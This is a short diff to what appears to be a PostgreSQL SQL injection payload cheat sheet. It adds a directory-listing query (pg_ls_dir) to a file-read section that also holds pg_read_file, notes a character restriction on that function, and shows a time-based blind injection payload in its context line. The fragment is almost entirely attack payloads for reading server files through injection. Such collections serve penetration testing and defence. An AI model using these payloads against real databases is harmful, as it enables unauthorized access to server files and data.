@@ -26,8 +26,11 @@ AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))
 ## PostgreSQL File Read
 
 ```sql
+select pg_ls_dir('./');
 select pg_read_file('PG_VERSION', 0, 200);
 ```
+
+NOTE: ``pg_read_file` doesn't accept the `/` character.
 
 ```sql
 CREATE TABLE temp(t TEXT);
